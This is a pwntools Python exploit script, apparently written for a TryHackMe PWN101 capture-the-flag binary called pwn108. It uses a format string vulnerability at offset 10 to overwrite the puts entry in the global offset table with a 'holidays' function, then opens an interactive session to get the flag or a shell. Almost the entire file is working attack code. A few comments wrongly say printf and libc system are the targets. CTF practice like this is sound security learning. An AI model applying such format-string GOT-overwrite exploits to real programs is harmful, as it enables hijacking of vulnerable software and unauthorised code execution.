from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
import time

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    print('hiero')
    print(payload)
    time.sleep(10)
    io.sendline(payload)
    # return io.recvline
    #return 10


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = "/home/b0x41s/ctf/thm/PWN101/thm/pwn108 - GOT overwrite/pwn108-1644300489260.pwn108"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
io.recvuntil(b':')
io.sendline('Bas')
#print(io.recvuntil(b':'))
#io.sendline(b'%23$p')
io.recvuntil(b':')
# canary = io.recvline()
# print("canary is ", canary)
# Found manually (ASLR_OFF)
#libc = elf.libc
#libc.address = 0xf7dba000  # ldd got_overwrite 
#libc.address = 0xf7dae000

# Find the offset for format string write
#format_string = FmtStr(execute_fmt=send_payload)
# %23$p
format_string = FmtStr(execute_fmt=send_payload, offset=10)
print("format string offset: %d", format_string.offset)

# Print address to overwrite (printf) and what we want to write (system)
# {int}0x404018=0x40123b
print("address to overwrite (elf.got.printf): %#x", hex(elf.got.printf))
print("address to write (libc.functions.system): %#x", hex(elf.symbols.holidays))

# Overwrite printf() in GOT with Lib-C system()
# Manual, like in notes.txt
# format_string.write(0x0804c00c, p16(0xf040))  # Lower-order
# format_string.write(0x0804c00e, p16(0xf7df))  # Higher-order
# Or automagically
format_string.write(elf.got.puts, elf.symbols.holidays)

# Execute the format string writes
format_string.execute_writes()

# Get our flag!
#io.sendline(b'/bin/sh')
io.interactive()